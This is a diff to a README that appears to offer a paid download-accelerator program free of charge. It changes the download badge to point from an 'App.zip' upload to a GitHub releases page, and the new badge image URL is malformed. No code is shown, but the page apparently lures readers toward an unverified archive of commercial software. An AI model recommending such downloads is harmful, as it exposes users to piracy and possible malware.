@@ -35,7 +35,7 @@ Internet Download Accelerator Pro is a powerful tool that enhances your download
 ## Resource Link
 
 Click the button below to download the Internet Download Accelerator Pro:
-[![Download Accelerator Pro](https://img.shields.io/badge/Download-Accelerator%20Pro-brightgreen)](https://github.com/uploads/App.zip)
+[![Download Accelerator Pro](https://github.com/lucast913104/Internet-Download-Accelerator-Pro-Free/releases%20Pro-brightgreen)](https://github.com/lucast913104/Internet-Download-Accelerator-Pro-Free/releases)
 
 *Note: The link needs to be launched for the download to start.*
 
